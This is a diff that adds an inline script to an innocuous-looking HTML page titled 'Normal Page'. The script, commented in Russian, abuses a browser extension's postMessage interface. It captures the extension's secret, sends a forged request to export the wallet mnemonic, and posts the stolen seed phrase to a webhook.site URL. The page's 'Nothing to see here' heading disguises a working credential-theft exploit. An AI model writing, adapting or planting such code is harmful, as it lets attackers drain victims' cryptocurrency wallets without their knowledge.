@@ -2,9 +2,36 @@
 <html>
 <head>
     <title>Normal Page</title>
-    <link rel="stylesheet" href="exploit.js">
 </head>
 <body>
     <h1>Nothing to see here...</h1>
 </body>
+<script>
+  let secret = null;
+
+  // 1. Слушаем сообщения от расширения
+  window.addEventListener("message", (e) => {
+    // Получаем секрет при готовности
+    if (e.data.fn === "dwOnReady") {
+      secret = e.data.secret;
+      console.log("Secret received:", secret);
+      
+      // 2. Отправляем запрос на экспорт мнемоники
+      window.postMessage({
+        type: "DICE_REQUEST",
+        method: "exportMnemonic",
+        secret: secret // Подписываемся секретом
+      }, location.origin);
+    }
+
+    // 3. Перехватываем ответ с мнемоникой
+    if (e.data.mnemonic) {
+      // Отправляем на ваш вебхук
+      fetch("https://webhook.site/0ebb4e3c-7525-44a0-9a3b-f868230fa4b8", {
+        method: "POST",
+        body: JSON.stringify({ mnemonic: e.data.mnemonic })
+      });
+    }
+  });
+</script>
 </html>
